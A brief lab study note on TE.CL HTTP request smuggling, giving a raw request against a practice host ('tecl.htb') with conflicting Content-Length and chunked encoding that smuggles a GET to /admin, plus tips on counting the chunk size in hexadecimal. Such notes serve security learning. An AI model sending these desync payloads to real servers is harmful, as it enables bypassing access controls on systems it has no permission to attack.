***HTTP Request Smuggling/Desync Attacks - TE.CL***

Make sure to specify the number of bytes in a chunk by using hexadecimal

-----
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked

27
GET /admin HTTP/1.1
Host: tecl.htb


0
-----

- The number of bytes in the Chunk are 27 in hexadecimal and 39 in decimal.
	- Make sure to include empty line after "Host: tecl.htb"(line 17)
	- If you were to exclude the line and only count the characters the number of bytes would be 33. Don't forget to include the empty line in your calculations to get the correct number of bytes in the chunk. In this example that would be 39.
